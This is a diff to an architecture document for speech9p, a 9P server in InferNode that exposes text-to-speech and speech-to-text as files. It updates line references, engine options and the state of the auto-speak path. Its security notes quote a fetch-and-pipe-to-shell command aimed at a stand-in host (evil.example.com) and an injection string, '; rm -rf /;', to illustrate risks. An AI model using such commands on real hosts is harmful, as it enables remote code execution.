@@ -3,8 +3,8 @@
 > **Scope.** Architecture of `speech9p`, the 9P file server that presents
 > text-to-speech (TTS) and speech-to-text (STT) as files. Covers its three
 > engine backends, the file/ctl protocol, the host-command bridge, and the
-> three consumers in InferNode (the `say` and `hear` Veltro tools, the
-> lucibridge auto-speak path, and direct shell use). Cross-host audio
+> consumers in InferNode (the `say` and `hear` Veltro tools and direct
+> shell use; lucibridge's auto-speak path is not currently wired, §7.3). Cross-host audio
 > composition is in [SPEECH-REMOTE-AUDIO.md](SPEECH-REMOTE-AUDIO.md).
 
 ## 1. Components at a glance
@@ -55,10 +55,10 @@ flowchart LR
 |---------------------------------|-------------------------------------|------|
 | `speech9p`                      | `appl/veltro/speech9p.b`            | The 9P server. Routes ctl/say/hear/voices to engine backends. |
 | `module/speech.m`               | `module/speech.m`                   | Abstract `TTSEngine`/`STTEngine` interface (currently descriptive — speech9p in-lines its three backends rather than loading separate engine modules). |
-| `say` tool                      | `appl/veltro/tools/say.b`           | Veltro tool that opens `/n/speech/say` and writes text. |
+| `say` tool                      | `appl/veltro/tools/say.b`           | Veltro tool that opens `/n/speech/say` and writes text. veltrosrv intercepts the agent's `say` calls (§7.1). |
 | `hear` tool                     | `appl/veltro/tools/hear.b`          | Veltro tool that writes `start <ms>` to `/n/speech/hear` and reads the transcription back. |
-| `lucibridge` auto-speak         | `appl/cmd/lucibridge.b:speaktext`   | GUI-side path: opens `/n/speech/say` itself when `/voice on` is active. Bypasses the agent tool. |
-| `nsconstruct` / `tools9p` glue  | `appl/veltro/nsconstruct.b`, `tools9p.b:992` | Auto-grants `/n/speech` to agents that have `say` or `hear` registered. |
+| `lucibridge` auto-speak         | `appl/cmd/lucibridge.b` (`/voice`, `-s`) | Sets an `autospeak` flag and registers the Speech resource; nothing speaks responses at present (`speaktext()` was removed in `483af071`). |
+| `nsconstruct` / `tools9p` glue  | `appl/veltro/nsconstruct.b`, `tools9p.b:applynsrestriction` | Auto-grants `/n/speech` to a `say` or `hear` tool invocation. |
 
 ## 2. Filesystem
 
@@ -165,10 +165,11 @@ flowchart TD
     start([speech9p starts]) --> arg{"-e flag?"}
     arg -- "-e cmd" --> cmd[engine = ENGINE_CMD]
     arg -- "-e api" --> api[engine = ENGINE_API]
-    arg -- "-e local" --> bug["✗ rejected by usage()<br/>(known parser bug)"]
+    arg -- "-e local" --> loc[engine = ENGINE_LOCAL]
     arg -- absent --> cmd
     cmd --> initplat[initplatform]
     api --> initplat
+    loc --> initplat
     initplat --> plat{platform?}
     plat -- macOS --> mac[cmdtts=say<br/>cmdstt=whisper-cli<br/>voice=samantha]
     plat -- Linux --> linprobe{piper +<br/>whisper-cli<br/>on PATH?}
@@ -178,16 +179,13 @@ flowchart TD
 
     runtime["runtime ctl write<br/>'engine local'"] -.-> promote
 
-    classDef bug fill:#fecaca,stroke:#b91c1c
     classDef good fill:#dcfce7,stroke:#15803d
-    class bug bug
     class promote,mac good
 ```
 
-The CLI parser rejecting `-e local` (`speech9p.b:147–155`) is a clear bug —
-`usage()`, `applyconfig`, and `readconfig` all know about the engine. Until
-fixed, set `local` via `echo 'engine local' > /n/speech/ctl` after launch,
-or rely on the Linux auto-promotion in `initplatform`.
+`-e local` is accepted by the option parser in `init` (`speech9p.b`, the
+`'e'` case); an unknown engine name prints an error and the usage message.
+`echo 'engine local' > /n/speech/ctl` also switches at runtime.
 
 ## 4. Data flow
 
@@ -268,7 +266,7 @@ sequenceDiagram
     FS-->>Caller: empty (already drained)
 ```
 
-The blocking-read design (`speech9p.b:1549` calls `dohear()` directly inside
+The blocking-read design (`speech9p.b:1587` calls `dohear()` directly inside
 the `Read` handler) means **only one STT operation can be in flight per
 speech9p instance**, and during that ~5–60 s window every other 9P
 operation queues. This is acceptable for the current single-microphone
@@ -402,9 +400,10 @@ binary opens the host's mic *directly* (`ffmpeg` via avfoundation,
 
 ## 7. Veltro and lucibridge integration
 
-Two unrelated paths feed `/n/speech/say`. They overlap deliberately —
-either an agent's tool call or the GUI's auto-speak mode produces speech;
-nothing arbitrates between them at the speech9p level.
+Two paths were designed to feed `/n/speech/say`: an agent's tool call and
+the GUI's auto-speak mode. The GUI path is not currently wired (§7.3), and
+the agent loop in veltrosrv intercepts `say` calls (§7.1). The diagram
+shows the design.
 
 ```mermaid
 flowchart TB
@@ -417,8 +416,8 @@ flowchart TB
     end
 
     subgraph guiside["GUI side"]
-        chat["lucifer chat<br/>response stream"]
-        bridge["lucibridge<br/>speaktext()"]
+        chat["Lucia chat<br/>response stream"]
+        bridge["lucibridge<br/>speaktext() (removed)"]
         slash["/voice on|off"]
         chat -. "if autospeak" .-> bridge
         slash -. toggles .-> bridge
@@ -457,6 +456,11 @@ It does **not** wait for TTS to finish (which matches speech9p's async
 write-side semantics — see §4.1). The agent gets `"ok"` back the moment
 the bytes are queued.
 
+The agent loop in `veltrosrv` intercepts `say` before it reaches the tool
+server: the text is added to the session's `text` as a `veltro say`
+message and the call returns `said`; `tools/say.b` is not run. Lucia shows
+it as its own conversation bubble.
+
 ### 7.2 The `hear` tool
 
 `appl/veltro/tools/hear.b`:
@@ -471,20 +475,17 @@ blocks the speech9p serveloop for the same duration.
 
 ### 7.3 lucibridge auto-speak
 
-A separate consumer driven by the `/voice on` slash command in the chat
-input. When enabled, every assistant response is piped through
-`speaktext()` (`appl/cmd/lucibridge.b:237`), which:
+Not currently wired. The `/voice on|off` slash command and `lucibridge -s`
+still set an `autospeak` flag, and with it lucibridge registers a Speech
+resource in the context zone; `/voice <name>` writes `voice <name>` to
+`/n/speech/ctl`. The function that spoke each response, `speaktext()`,
+was removed when the agent loop moved to veltrosrv (`483af071`), and
+nothing in the tree has taken its place.
 
-1. Writes `resource update path=speech status=active` to the activity's
-   context channel (status zone in the GUI).
-2. Opens `/n/speech/say` and writes the response text.
-3. Writes `resource update path=speech status=idle` once the *write*
-   returns. This is misleading — the write returns when the bytes are
-   queued, **not** when TTS finishes playing. The GUI shows "idle" while
-   audio is still coming out.
-
-`agentlib.b:537` (`stripmarkdown`) pre-processes the response so headers,
-`**bold**`, code fences, and similar don't get spelled out literally.
+As it was: every assistant response was passed through
+`agentlib->stripmarkdown()` (still in `appl/veltro/agentlib.b`) and written
+to `/n/speech/say`, with the Speech resource set `active`, then `idle` once
+the write returned (before audio finished playing).
 
 ### 7.4 Namespace gating
 
@@ -492,9 +493,10 @@ By default a Veltro agent's namespace strips `/n` down to whatever
 `caps.paths` allows. `/n/speech` would therefore be invisible to most
 agents. Two mechanisms ensure say/hear actually work:
 
-- **Auto-grant in tools9p** (`tools9p.b:992`): if the agent has `say` or
-  `hear` registered, `/n/speech` is added to `allpaths` automatically.
-- **Auto-grant in nsconstruct** (`nsconstruct.b:212`): if `/n/speech` is
+- **Auto-grant in tools9p** (`applynsrestriction()` in `tools9p.b`): when
+  the invoked tool is `say` or `hear`, `/n/speech` is added to `allpaths`
+  automatically.
+- **Grant in nsconstruct** (`restrictns()` in `nsconstruct.b`): if `/n/speech` is
   in `caps.paths` *and* it actually exists on the host, it's added to
   the agent's `nallow` list.
 
@@ -513,7 +515,7 @@ flowchart LR
     end
     subgraph semi["Semi-trusted"]
         agent["Veltro agent<br/>(restricted ns)"]
-        gui["lucifer GUI"]
+        gui["Lucia GUI"]
     end
     subgraph risk["Risks"]
         ctlrce["ctl write →<br/>RCE on host"]
@@ -551,14 +553,14 @@ flowchart LR
 
 - Run speech9p only on hosts where the operator actually wants speech
   (the bundled desktop, voice-front-end Jetsons). It is started by
-  `lib/sh/profile` only on the `MacOSX` and `Linux` desktop branches.
+  `lib/sh/profile` only on the desktop branch (`MacOSX`, `Linux`, `Nt`).
 - Prefer the `local` engine on Linux/Jetson — no API key, no network
   egress for normal use. Auto-promotion handles this when the binaries
   are installed.
 - If using the `api` engine, scope the API key to TTS/STT only; do not
   reuse a chat-completion key for the speech endpoint unless you have to.
 - Treat `/n/speech/ctl` as a privileged file. The auto-grant in
-  `tools9p.b:992` and `nsconstruct.b:212` adds the *whole `/n/speech`
+  `tools9p.b` (`applynsrestriction()`) and `nsconstruct.b` adds the *whole `/n/speech`
   directory* to agent namespaces — agents that have `say` or `hear` can
   also `echo 'cmdtts curl evil.example.com | sh' > /n/speech/ctl`. A
   hardening pass that exposes only `say` and `hear` (e.g. `bind -b` of
@@ -569,7 +571,6 @@ flowchart LR
 ```mermaid
 flowchart LR
     subgraph today["Today"]
-        l1["-e local rejected by parser"]
         l2["read /n/speech/hear blocks serveloop"]
         l3["ctl reachable from agents<br/>that have say/hear"]
         l4["/dev/audio exclusive use"]
@@ -579,7 +580,6 @@ flowchart LR
         l8["say-status read returns<br/>before audio finishes playing"]
     end
     subgraph fix["Fix / roadmap"]
-        f1["one-line parser fix"]
         f2["spawn dohear like asyncsay"]
         f3["bind individual say/hear<br/>into agent ns; hide ctl"]
         f4["multi-client mux on<br/>/dev/audio (out of scope)"]
@@ -589,7 +589,6 @@ flowchart LR
         f8["block status read until<br/>audio drained"]
     end
 
-    l1 --> f1
     l2 --> f2
     l3 --> f3
     l4 --> f4
@@ -600,12 +599,12 @@ flowchart LR
 
     classDef cur fill:#fef9c3,stroke:#a16207
     classDef good fill:#dcfce7,stroke:#15803d
-    class l1,l2,l3,l4,l5,l6,l7,l8 cur
-    class f1,f2,f3,f4,f5,f6,f7,f8 good
+    class l2,l3,l4,l5,l6,l7,l8 cur
+    class f2,f3,f4,f5,f6,f7,f8 good
 ```
 
-1. **`-e local` rejected by the CLI parser** even though every other code
-   path knows about it (`speech9p.b:147–155`). One-line fix.
+1. **`-e local` rejected by the CLI parser** — fixed; `init` now accepts
+   it.
 2. **STT blocks the serveloop.** Until `dohear()` is spawned the same way
    `dosay()` is, only one client at a time can use `/n/speech` while STT
    is running.
@@ -665,7 +664,7 @@ cmdtts say
 cmdstt whisper-cli
 ```
 
-The macOS preset in `initplatform` (`speech9p.b:206–214`) is what populates
+The macOS preset in `initplatform` (`speech9p.b:214`) is what populates
 those values — no environment variables, no config file. To change them
 permanently you have to either patch that case, or write to `ctl` after
 boot (the writes don't persist; restart loses them).
@@ -718,7 +717,7 @@ What's worth knowing:
   is (`"; rm -rf /;`), it never gets parsed by `sh`.
 - The full shell command actually executed on the host is
   `/bin/sh -c 'say -v samantha'`. The `'…'` quoting around the command
-  itself is constructed by `runcmd_stdin` (`speech9p.b:946`).
+  itself is constructed by `runcmd_stdin` (`speech9p.b:960`).
 - `cat /n/speech/say` after the call returns `ok`. That value is set the
   moment `say` exits — i.e. *after* the audio plays, because macOS `say`
   blocks until playback completes.
@@ -770,7 +769,7 @@ macOS-specific gotchas:
 
 - **The model path is hard-coded** to
   `/opt/homebrew/share/whisper-cpp/models/ggml-base.en.bin`
-  (`speech9p.b:569`). That's correct for `brew install whisper-cpp` on
+  (`hearcmd_macos`, `speech9p.b:598`). That's correct for `brew install whisper-cpp` on
   Apple Silicon; on Intel macs with `/usr/local` brew prefix it is wrong
   and STT will silently produce `"error: transcription failed"`. You
   cannot fix this through `ctl` (the `cmdstt` ctl key only sets the
@@ -826,7 +825,7 @@ What changes vs. §10.2:
   `/dev/audioctl` and writes through `/dev/audio`. CoreAudio plays
   through Inferno's audio driver, not directly.
 - If you keep the macOS-default `voice samantha`, the `api` path
-  silently rewrites it to `alloy` (`speech9p.b:501`). This is the
+  silently rewrites it to `alloy` (`sayapi`, `speech9p.b:531`). This is the
   voice-fallback footgun mentioned in §9.6.
 - STT (`hear`) becomes `hearapi` → `recordaudio` via `/dev/audio` →
   WAV → multipart POST to `apiurl/audio/transcriptions`. That's the
@@ -859,17 +858,17 @@ switch on Intel macs where the cmd path is broken (§10.3).
 | `hear` returns `error: transcription failed`            | Hard-coded `/opt/homebrew/share/whisper-cpp/...` model path doesn't exist (Intel mac, custom brew prefix, model not downloaded). | Switch to `engine local` and set `whispermodel` via ctl. |
 | `hear` returns `(no speech detected)` but mic is loud   | First-run macOS microphone permission prompt was dismissed.                            | Grant Microphone access to the launching Terminal/app in System Settings → Privacy → Microphone, then retry. |
 | `engine api` TTS produces no sound                      | `/dev/audio` not bound or held by another client (Inferno audio driver issue).         | Stick with `engine cmd` on macOS unless you specifically need API voices. |
-| `voice samantha` becomes Alloy on api engine            | Hard-coded fallback at `speech9p.b:501`.                                               | Set an explicit OpenAI-known voice (`alloy`/`echo`/`fable`/`nova`/`onyx`/`shimmer`). |
+| `voice samantha` becomes Alloy on api engine            | Hard-coded fallback in `sayapi` (`speech9p.b:531`).                                               | Set an explicit OpenAI-known voice (`alloy`/`echo`/`fable`/`nova`/`onyx`/`shimmer`). |
 | `cat /n/speech/voices` lists hundreds of voices         | `say -v ?` enumerates every installed voice, including the multi-language ones.        | Working as intended; pipe through `grep` to filter. |
-| Lucifer's "Speech" status zone goes idle while audio still playing | `speaktext()` flips to `idle` when its `write` returns, not when audio drains. | Cosmetic — see §9.8. |
 
 ## 11. Pointers
 
 - Code: `appl/veltro/speech9p.b`, `appl/veltro/tools/say.b`,
-  `appl/veltro/tools/hear.b`, `appl/cmd/lucibridge.b:237`,
-  `appl/veltro/nsconstruct.b:188-216`, `appl/veltro/tools9p.b:992`,
+  `appl/veltro/tools/hear.b`, `appl/veltro/veltrosrv.b` (the `say`
+  interception), `appl/veltro/nsconstruct.b` (`restrictns`),
+  `appl/veltro/tools9p.b` (`applynsrestriction`),
   `module/speech.m`.
-- Boot: `lib/sh/profile:112` (`speech9p -e cmd &` on macOS/Linux).
+- Boot: `lib/sh/profile:321` (`speech9p -e cmd &` on macOS, Linux and Windows).
 - Manual page: `man/4/speech`.
 - Companion docs: [SPEECH-REMOTE-AUDIO.md](SPEECH-REMOTE-AUDIO.md)
   (cross-host audio composition), [ARCHITECTURE.md](ARCHITECTURE.md)
